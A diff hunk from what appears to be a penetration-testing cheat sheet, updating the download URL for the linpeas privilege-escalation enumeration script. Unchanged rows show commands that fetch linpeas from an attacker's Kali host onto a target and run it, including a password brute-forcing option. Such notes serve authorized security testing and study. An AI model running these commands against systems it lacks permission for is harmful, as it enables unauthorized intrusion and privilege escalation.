@@ -817,7 +817,7 @@ First checks - always run:
 
 |   |   |
 |---|---|
-|Prepare Kali|`curl -L -o /var/www/html/linpeas.sh https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh`|
+|Prepare Kali|`curl -sLo /var/www/html/linpeas.sh https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh`|
 |Download and run on target|`curl -O http://$KALI/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh`|
 |All checks - deeper system enumeration, but it takes longer to complete|`./linpeas.sh -a`|
 |Password - Pass a password that will be used with sudo -l and bruteforcing other users|`./linpeas.sh -P`|
